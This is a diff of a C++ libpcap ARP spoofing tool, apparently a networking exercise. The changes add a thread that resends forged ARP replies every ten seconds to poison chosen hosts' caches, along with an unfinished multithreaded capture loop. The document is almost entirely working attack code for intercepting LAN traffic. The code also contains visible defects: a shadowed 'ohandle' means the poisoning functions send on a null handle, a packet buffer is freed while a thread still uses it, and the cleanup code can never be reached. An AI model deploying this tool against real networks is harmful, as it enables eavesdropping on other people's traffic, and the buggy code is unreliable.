@@ -1,29 +1,37 @@
-#define core_num 3
+#define core_num 4
 #include <iostream>
 #include <string>
 #include <stdint.h>
 #include <cstring>
 #include <pcap.h>
 #include <ctype.h>
+#include <unistd.h>
 #include "proto_structures.h"
 #include "local_address.h"
 #include <map>
+#include <set>
+#include <utility>
+#include <vector>
+#include <pthread.h>
+#include <semaphore.h>
 
-struct ipv4_comp{
-	bool operator()(const ipv4_addr a,const ipv4_addr b) const{
-		return a.word<b.word;
-	}
-};
-std::map<ipv4_addr,mac_addr,ipv4_comp> ip_to_mac;
-char errbuf[PCAP_ERRBUF_SIZE];
+std::map<uint32_t,mac_addr> ip_to_mac;
+std::map<uint32_t,std::set<uint32_t>> s2t;
+std::map<uint32_t,std::set<uint32_t>> t2s;
 
-void add_ip(const ipv4_addr& ip,const ipv4_addr& my_ip,const mac_addr& my_mac,pcap_t* handle){
-	do{
+std::vector<int> proc_manage;
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+sem_t sem;
+
+pcap_t* ohandle;
+pthread_mutex_t omutex = PTHREAD_MUTEX_INITIALIZER;
+
+ipv4_addr my_ip;
+mac_addr my_mac;
+
+void add_ip(const ipv4_addr& ip,pcap_t* handle){
+	for(;;){
 		arp_eth_ipv4 packet(my_mac,my_ip,ip);
-		if(handle==nullptr){
-			printf("pcap error : %s\n",errbuf);
-			exit(1);
-		}
 		pcap_sendpacket(handle,packet,sizeof packet);
 		pcap_pkthdr* hdr;
 		const uint8_t* ptr;
@@ -32,64 +40,68 @@ void add_ip(const ipv4_addr& ip,const ipv4_addr& my_ip,const mac_addr& my_mac,pc
 			exit(1);
 		}
 		memcpy(&packet,ptr,sizeof packet);
-	}while(memcmp(&packet.sip,&ip,sizeof ip)||packet.arptype!=htons(0x0002));
-	
-	ip_to_mac[ip]=packet.smac;
+		if(packet.sip.word==ip.word&&packet.arptype==htons(0x0002)){
+			ip_to_mac[ip.word]=packet.smac;
+			return;
+		}
+	}
 }
 
-/*
-mac_addr arp_request(const ipv4_addr& sip,const ipv4_addr& tip,const mac_addr& smac,const char *dev){
-	arp_eth_ipv4 packet(smac,sip,tip);
-	
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle=pcap_open_live(dev,BUFSIZ,1,1,errbuf);
-	if(handle==nullptr){
-		printf("pcap error : %s\n",errbuf);
-		exit(1);
-	}
-	pcap_sendpacket(handle,packet,42);
-	pcap_pkthdr* hdr;
-	const uint8_t* ptr;
-	if(!pcap_next_ex(handle,&hdr,&ptr)){
-		printf("arp no reply\n");
-		exit(1);
-	}
-	memcpy(&packet,ptr,42);
-	pcap_close(handle);
-	return packet.smac;
+void arp_poison(const ipv4_addr& sip,const ipv4_addr& tip){
+	mac_addr smac=ip_to_mac[sip.word];
+	arp_eth_ipv4 packet(my_mac,smac,tip,sip);
+	pthread_mutex_lock(&omutex);
+	pcap_sendpacket(ohandle,packet,sizeof packet);
+	pthread_mutex_unlock(&omutex);
 }
-*/
-
-void arp_poison(const char *str_sip,const char *str_tip,const ipv4_addr& ip,const mac_addr &mac,pcap_t* handle){
-	ipv4_addr sip(str_sip);
-	ipv4_addr tip(str_tip);
-	mac_addr smac=ip_to_mac[sip];
-	
-	arp_eth_ipv4 packet(mac,smac,tip,sip);
-	
-	if(handle==nullptr){
-		printf("pcap error : %s\n",errbuf);
-		exit(1);
-	}
-	pcap_sendpacket(handle,packet,42);
-}
-void arp_recover(const char *str_sip,const char *str_tip,const ipv4_addr& ip,const mac_addr &mac,pcap_t* handle){
-	ipv4_addr sip(str_sip);
-	ipv4_addr tip(str_tip);
-	mac_addr smac=ip_to_mac[sip];
-	
-	arp_eth_ipv4 packet(mac,smac,tip,sip);
-	
-	if(handle==nullptr){
-		printf("pcap error : %s\n",errbuf);
-		exit(1);
-	}
-	
-	pcap_sendpacket(handle,packet,sizeof packet);
+void arp_recover(const ipv4_addr& sip,const ipv4_addr& tip){
+	mac_addr smac=ip_to_mac[sip.word];
+	mac_addr tmac=ip_to_mac[tip.word];
+	arp_eth_ipv4 packet(tmac,smac,tip,sip);packet.src=my_mac;
+	pthread_mutex_lock(&omutex);
+	pcap_sendpacket(ohandle,packet,sizeof packet);
+	pthread_mutex_unlock(&omutex);
 }
 
-void* process_packet(void* num){
+void process_arp(arp_eth_ipv4* packet){
 	
+}
+
+void process_ip(ipv4_eth* packet){
+}
+
+void* process_packet(void* param){
+	int idx = 0[(uint32_t*)param];
+	int len = 1[(uint32_t*)param];
+	arp_eth_ipv4* arp=(arp_eth_ipv4*)(8+(uint8_t*)param);
+	if(arp->is_valid()){
+		process_arp(arp);
+	}
+	else{
+		ipv4_eth* ipv4=(ipv4_eth*)(8+(uint8_t*)param);
+		if(ipv4->is_valid()){
+			process_ip(ipv4);
+		}
+		//nothing to do when it is neither ipv4 nor arp
+	}
+	
+	pthread_mutex_lock(&mutex);
+	proc_manage.push_back(idx);
+	pthread_mutex_unlock(&mutex);
+	sem_post(&sem);
+	return nullptr;
+}
+
+void* continue_poisoning(void* param){
+	auto& stpairs=*(std::vector<std::pair<ipv4_addr,ipv4_addr>>*)param;
+	for(;;){
+		for(auto&[s,t]:stpairs)
+			arp_poison(s,t);
+		
+		sleep(10);
+	}
+	for(auto&[s,t]:stpairs)
+		arp_recover(s,t);
 	return nullptr;
 }
 
@@ -98,15 +110,37 @@ int main(int c,char **v){
 		printf("syntex : send-arp <interface> <sender ip> <target ip> ...\n");
 		return 1;
 	}
-	mac_addr mac=get_mac_addr(v[1]);
-	ipv4_addr ip=get_ipv4_addr(v[1]);
-	pcap_t* handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
-	for(int i=2;i<c;i++)
-		add_ip(v[i],ip,mac,handle);
-	for(int i=2;i<c;i+=2)
-		arp_poison(v[i],v[i+1],ip,mac,handle);
+	char errbuf[PCAP_ERRBUF_SIZE];
+	my_mac=get_mac_addr(v[1]);
+	my_ip=get_ipv4_addr(v[1]);
 	
+	std::vector<std::pair<ipv4_addr,ipv4_addr>> stpairs;
+	for(int i=2;i<c;i+=2){
+		ipv4_addr s(v[i]);
+		ipv4_addr t(v[i+1]);
+		stpairs.emplace_back(s,t);
+		s2t[s.word].insert(t.word);
+		t2s[t.word].insert(s.word);
+	}
+	pcap_t* handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
+	if(handle==nullptr){
+		printf("pcap error : %s\n",errbuf);
+		exit(1);
+	}
+	pcap_t* ohandle=pcap_open_live(v[1],0,0,0,errbuf);
+	if(ohandle==nullptr){
+		printf("pcap error : %s\n",errbuf);
+		exit(1);
+	}
+	for(int i=2;i<c;i++)
+		add_ip(v[i],handle);
 	pthread_t th[core_num];
+	int usedth[core_num]={0};
+	void * nevermind;
+	for(int i=1;i<core_num;i++)
+		proc_manage.push_back(i);
+	sem_init(&sem, 0, core_num-1);
+	pthread_create(th,NULL,continue_poisoning,&stpairs);
 	
 	for(;;){
 		pcap_pkthdr* hdr;
@@ -115,19 +149,30 @@ int main(int c,char **v){
 			printf("pcap listing failed\n");
 			exit(1);
 		}
-		int len=header->caplen;
-		void* packet=malloc(len);
-		memcpy(packet,ptr,len);
+		sem_wait(&sem);
+		pthread_mutex_lock(&mutex);
+		int idx=proc_manage.back();proc_manage.pop_back();
+		pthread_mutex_unlock(&mutex);
+		int len=hdr->caplen;
+		uint8_t* packet=(uint8_t*)malloc(len+8);
+		memcpy(packet+8,ptr,len);
+		0[(uint32_t*)packet]=idx;
+		1[(uint32_t*)packet]=len;
+		
+		if(usedth[idx])
+			pthread_join(th[idx], &nevermind);
+		else usedth[idx]=1;
+		pthread_create(th+idx,NULL,process_packet,packet);
 		
 		free(packet);
 	}
 	
-	for(int i=0;i<core_num;i++){
-		
-	}
-	
-	for(int i=2;i<c;i+=2)
-		arp_recover(v[i],v[i+1],ip,mac,handle);
+	sem_destroy(&sem);
+	pthread_join(th[0], &nevermind);
+	for(int i=0;i<core_num;i++)
+		if(usedth[i])
+			pthread_join(th[i], &nevermind);
 	pcap_close(handle);
+	pcap_close(ohandle);
 	return 0;
 }
